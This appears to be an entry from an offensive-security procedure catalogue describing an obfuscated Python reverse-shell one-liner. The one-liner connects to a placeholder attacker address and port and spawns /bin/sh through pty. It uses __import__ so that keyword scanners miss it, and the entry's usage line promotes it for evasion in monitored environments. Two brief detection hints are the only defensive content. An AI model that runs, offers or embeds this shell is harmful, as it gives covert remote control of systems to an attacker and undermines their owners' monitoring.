---
id: 11f9968c-f902-4d98-910c-ce2d7f8dfa52
type: code
language: Python
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - reverse-shell
  - python
  - obfuscated
  - pty
validated: true
---

# Python-Obfuscated-Reverse-Shell-Import-PTY

## Code

```python
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

## Description

Obfuscated using __import__ to load modules, then creates socket and PTY shell like the basic version, evading keyword scans.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | Attacker's IPv4 address | 10.0.0.1 |
| $_ATTACKER_PORT | Attacker's listening port | 4242 |

## Usage

For evasion in monitored environments; execute with listener.

## Detection

- __import__ calls for socket/os/pty.
- Behavioral: outbound socket + shell spawn.

## Related

- [[procedures/Establish-Python-Reverse-Shell]]
